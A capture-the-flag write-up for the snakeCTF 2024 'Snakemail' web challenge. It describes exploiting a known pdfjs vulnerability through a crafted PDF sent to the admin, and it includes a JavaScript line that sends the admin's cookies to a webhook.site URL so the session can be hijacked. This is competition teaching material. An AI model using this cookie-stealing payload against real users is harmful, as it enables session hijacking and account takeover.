# Snakemail [_snakeCTF 2024 Finals_]

**Category**: Web

## Description

Apparently, the admin has a secret hidden in his emails. Can you find it?

(admin email is `admin@mail.snakectf.org`)

## Solution

### Step 1: Analysing the frontend

The initial step involves inspecting how the frontend works. Users can attach files to an email. The allowed file types are: PNG, JPEG, GIF, WEBP, PDF, DOC, DOCX, XLS, XLSX. When a PDF file is viewed in an email, the page that renders the PDF preview can be identified as `/pdf?email=...&id=...`.

By examining the Webpack chunk files, the library responsible for rendering the PDF files, `pdfjs`, is identified. Investigating the library's source code reveals a variable, `apiVersion`, which stores the version number of the library. Searching for this variable in the chunk files uncovers the library version, `4.1.392`.

### Step 2: Exploiting the PDF viewer

Searching online for the library's version number leads to the discovery of a [security advisory](https://nvd.nist.gov/vuln/detail/CVE-2024-4367) describing a vulnerability in the library. This vulnerability enables an attacker to execute arbitrary JavaScript code within the PDF viewer's context. A [proof of concept](https://github.com/LOURC0D3/CVE-2024-4367-PoC) demonstrates how to exploit this issue.

A malicious PDF file can be crafted to exploit this vulnerability and sent to the admin's email address to steal the cookies. An example payload is provided below:

```javascript
fetch('https://webhook.site/your-uuid?cookie=' + btoa(document.cookie));
```

When the admin opens the PDF, the cookies are exfiltrated to the specified webhook.

### Step 3: Logging in as the admin

After obtaining the admin's cookies, they can be used to log in as the admin. The secret hidden in the adminâ€™s emails can then be accessed.
